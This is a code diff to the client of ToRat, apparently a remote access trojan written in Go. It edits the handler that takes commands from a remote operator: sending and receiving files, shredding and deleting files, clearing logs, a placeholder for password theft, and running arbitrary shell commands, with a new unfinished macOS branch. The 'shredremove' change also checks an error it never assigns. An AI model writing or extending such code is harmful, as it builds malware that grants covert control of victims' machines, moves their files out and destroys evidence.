@@ -10,8 +10,8 @@ import (
 
 	"github.com/lu4p/ToRat_client/crypto"
 	"github.com/lu4p/ToRat_client/screen"
-	"github.com/lu4p/ToRat_client/shred"
 	"github.com/lu4p/cat"
+	"github.com/lu4p/shred"
 )
 
 func ls(path string) string {
@@ -52,6 +52,7 @@ func (c *connection) shell() {
 		case "down":
 			out = false
 			c.sendFile(cmdsp[1])
+
 		case "up":
 			out = false
 			c.recvFile(cmdsp[1])
@@ -75,7 +76,7 @@ func (c *connection) shell() {
 		case "cat":
 			txt, err := cat.Cat(cmdsp[1])
 			if err != nil {
-				ouput = "Something went wrong could not get txt!"
+				output = []byte("Something went wrong could not get txt!")
 			} else {
 				output = []byte(txt)
 			}
@@ -84,11 +85,21 @@ func (c *connection) shell() {
 		case "lazange":
 			// TODO: add password recovery
 		case "shred":
-			shred.Path(cmdsp[1], false)
-			output = []byte("File(s) are shredded")
+			shredconf := shred.Conf{Times: 1, Zeros: true, Remove: false}
+			err := shredconf.Path(cmdsp[1])
+			if err != nil {
+				output = []byte("File(s) could not be shredded")
+			} else {
+				output = []byte("File(s) are shredded")
+			}
 		case "shredremove":
-			shred.Path(cmdsp[1], true)
-			output = []byte("Files are shredded and removed")
+			shredconf := shred.Conf{Times: 1, Zeros: true, Remove: true}
+			shredconf.Path(cmdsp[1])
+			if err != nil {
+				output = []byte("File(s) could not be shredded")
+			} else {
+				output = []byte("File(s) are shredded and deleted")
+			}
 		case "escape":
 			runCmd(cmdsp[1], false)
 		case "clearlog":
@@ -105,7 +116,7 @@ func (c *connection) shell() {
 			if err != nil {
 				return
 			}
-			output = []byte(strings.Join(files, " "))
+			output = []byte(strings.Join(files, ";"))
 
 		default:
 			output = runCmd(cmd, powershell)
@@ -137,6 +148,10 @@ func runCmd(cmd string, powershell bool) []byte {
 			osshell = "cmd"
 			osshellargs = []string{"/C", cmd}
 		}
+	} else if runtime.GOOS == "darwin" {
+		// TODO: Add right strings for Mac OSX
+		osshell = ""
+		osshellargs = []string{"", cmd}
 	}
 	execcmd := exec.Command(osshell, osshellargs...)
 	cmdout, err := execcmd.Output()
